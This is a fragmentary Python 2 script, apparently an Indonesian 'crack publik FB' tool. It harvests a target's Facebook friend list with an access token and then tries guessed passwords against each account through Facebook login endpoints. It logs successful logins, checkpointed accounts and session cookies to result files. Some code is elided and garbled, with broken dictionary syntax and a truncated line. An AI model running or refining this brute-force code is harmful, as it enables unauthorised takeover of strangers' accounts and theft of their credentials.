...
logo = ''' \033[0;96m
 ...
 \x1b[1;91m██████  ██  ██
 \x1b[1;97m██      ██  ██
 \x1b[1;97m██      ██  ██\x1b[1;92m▬▬ι═══════ﺤ  \033[0m'''
...
def moch_yayan():
    ...
    print '█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\n';time.sleep(0.03)
    print '\x1b[1;91m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\n';time.sleep(0.03)
    print '█   FB• %s\x1b[1;91m    █'%(nama);time.sleep(0.03)
    print '█   IP•%s\x1b[1;97m     █'%(IP)
    print '\x1b[1;97m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n';time.sleep(0.03)
    print '█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n';time.sleep(0.03)
    print '\x1b[1;91m ━━━━━━━━━━▣━━◤𝙵◢━━▣━━━━━━━━━━━\n';time.sleep(0.03)
    print '【%sI%s】\x1b[1;91m 𝙸𝙽𝙳𝙾𝙽𝙴𝚂𝙸𝙰  CRACK PUBLIK \x1b[1;97mFB'%(O,N);time.sleep(0.08)
    print '【%sN%s】\x1b[1;91m▉▉▉▉▉▉▉▉▉▉▉ \x1b[1;97mGAS CRACK'%(O,N);time.sleep(0.08)
    print '【%sD%s】\x1b[1;91m▉▉▉▉▉▉▉▉▉▉▉ LIAT HASIL'%(O,N);time.sleep(0.08)
    print '【%sO%s】\x1b[1;97m▉▉▉▉▉▉▉▉▉▉▉ HAPUS TOKEN'%(O,N);time.sleep(0.08)
    print '【%s0%s】\x1b[1;97m▉▉▉▉▉▉▉▉▉▉▉ KELUAR %s%s'%(M,N,M,N);time.sleep(0.08)
    print ' ━━━━━━━━━━▣━━◤𝙵\x1b[1;97m◢━━▣━━━━━━━━━━━\n';time.sleep(0.03)
    pepek = raw_input('\n【𝗙】 PILIH ➚ : ')
    if pepek == '':
...
def __menu__():
                ...
                try:
                        ...
                        for pw in pwx:
                                headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(ran                                   >
                                'x-fb-net-hni' (random.randint(20000, 40000)),
                                'x-fb-connection-quality' 'EXCELLENT',
                                'x-fb-connection-type' 'cell.CTRadioAccessTechnologyHSDPA',
                                'user-agent'
                                'content-type' 'application/x-www-form-urlencoded',
                                'x-fb-http-engine' 'Liger'}                                                                                                                                                     ses=requests.Session()
                                ...
                                send=ses.get(api,params=param, headers=headers_)                                                                                                                                 if "access_token" in send.text and "EAAA" in send.text:
...
def publik(kontol):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
            ...
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] '%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s𝚏𝚒𝚛 %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                ...
                try:
                    ...
                    month = bulan_ttl[month]
                    print '\r  %s𝚏𝚒𝚛 %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                ...
                print '\r  %s𝚏𝚒𝚛 %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r  %s𝚏𝚒𝚛 %s|%s|%s                 %s' % (H,user,pw,kuki,N)
